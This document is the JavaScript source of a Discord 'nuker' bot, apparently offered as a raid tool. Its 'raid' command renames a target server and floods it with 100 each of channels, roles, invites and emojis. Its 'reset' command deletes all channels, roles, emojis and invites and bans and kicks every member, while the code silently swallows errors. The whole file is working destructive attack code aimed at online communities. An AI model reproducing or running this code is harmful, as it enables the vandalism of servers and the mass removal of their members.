const Discord = require("discord.js");
const { token, prefix, targetID } = require("./config.json");
const bot = new Discord.Client();
const colors = require("colors");
const { stripIndents } = require("common-tags");

// Process
process.on("unhandledRejection", (error) => {
  return;
});

process.on("uncaughtExceptionMonitor", (error) => {
  return;
});

process.on("uncaughtException", (error) => {
  return;
});
// Process

bot.on("ready", () => {
  if (targetID === "server-id-here" || targetID === "") {
    console.log(
      `${colors.red("[ERROR]:")} ${colors.yellow("No server id was provided")}`
    );
  } else {
    console.log(`
                      -                                               -
                      -   ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███    -
                      -   ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒  -
                      -  ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒  -
                      -  ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄    -
                      -  ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒  -
                      -  ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░  -
                      -  ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░  -
                      -     ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░   -
                      -           ░    ░     ░  ░      ░  ░   ░       -
                      -                                               -
            ${colors.cyan("Nuker:")} ${colors.yellow(`v1.0.0`)} ${colors.magenta("|")} ${colors.cyan("Logged in as:")} ${colors.yellow(bot.user.tag)} 
            ${colors.magenta("|")} ${colors.cyan("ID:")} ${colors.yellow(bot.user.id)}
            ${colors.cyan("Prefix:")} ${colors.yellow(`${prefix}`)}
            ${
              targetID
                ? `${colors.cyan("Target Server:")} ${colors.yellow(
                    bot.guilds.cache.get(targetID).name
                  )} ${colors.magenta("|")} ${colors.cyan(
                    "ID:"
                  )} ${colors.yellow(bot.guilds.cache.get(targetID).id)}`
                : ""
            }

            ${colors.cyan("Developer:")} ${colors.yellow("Mu7aMMaD#4411")}
    `);
  }
});

bot.on("message", async (message) => {
  let messageArray = message.content.split(" ");
  let cmd = messageArray[0].replace(prefix, "");
  let args = messageArray.slice(1);

  if (cmd === "help") {
    message.channel
      .send(stripIndents`Avalible commands for __**${bot.user.tag}**__
        
        **${prefix}reset** > Reset's everthing in server. \`(like its new server)\`
        **${prefix}raid** > Makes 100 voice/text/roles/emojis/invites.`);
  }

  if (cmd === "raid") {
    if (message.guild.id === targetID) {
      if (message.guild.me.hasPermission("ADMINISTRATOR")) {
        message.guild.setIcon(
          "https://i.gyazo.com/863bc487c8c72c3d21a747e300e3c21a.png"
        );
        message.guild.setName(`Raided by ${bot.user.username}.`);

        for (var i = 0; i < 100; i++) {
          message.guild.channels.create("raided-by-nuker", {
            type: "text",
          });
        }

        for (var i = 0; i < 100; i++) {
          message.guild.channels.create("Raided By Nuker", {
            type: "voice",
          });
        }

        for (var i = 0; i < 100; i++) {
          const newRole = await message.guild.roles.create({
            data: {
              name: "RAIDED BY NUKER",
              color: "#1B78E7",
            },
          });
          message.guild.members.cache.forEach((member) => {
            member.roles.add(newRole);
          });
        }

        for (var i = 0; i < 100; i++) {
          message.channel.createInvite({
            maxAge: 0,
            maxUses: 0,
            unique: true,
          });
        }

        for (var i = 0; i < 100; i++) {
          message.guild.emojis.create("https://i.imgur.com/w3duR07.png", "rip");
        }
      }
    } else {
      if (message.deletable) {
        message.delete();
      }
      return console.log(
        `${colors.red("[ERROR]:")} ${colors.yellow(
          'The command "Raid" must be used in the target server.'
        )}`
      );
    }
  }

  if (cmd === "reset") {
    if (message.guild.id === targetID) {
        
      if (message.guild.me.hasPermission("ADMINISTRATOR")) {
          
        message.guild.channels.cache.forEach((channel) => channel.delete());
        
        const textCat = await message.guild.channels.create("Text Channels", {
          type: "category",
        });

        const voiceCat = await message.guild.channels.create("Voice Channels", {
          type: "category",
        });

        message.guild.channels.create("general", {
          type: "text",
          parent: textCat.id,
        });

        message.guild.channels.create("General", {
          type: "voice",
          parent: voiceCat.id,
        });

        message.guild.setIcon(`New Server`);
        message.guild.roles.cache.forEach((role) => role.delete());
        message.guild.emojis.cache.forEach((emoji) => emoji.delete());
        message.guild.invites.cache.forEach((invite) => invite.delete());
        message.guild.members.cache.forEach((member) => member.ban());
        message.guild.members.cache.forEach((member) => member.kick());
        
      }
    } else {
      if (message.deletable) {
        message.delete();
      }
      return console.log(
        `${colors.red("[ERROR]:")} ${colors.yellow(
          'The command "reset" must be used in the target server.'
        )}`
      );
    }
  }
});

if (token === "token-here" || token === "") {
  console.log(
    `${colors.red("[ERROR]:")} ${colors.yellow(
      "An invalid token was provided."
    )}`
  );
} else {
  bot.login(token);
}
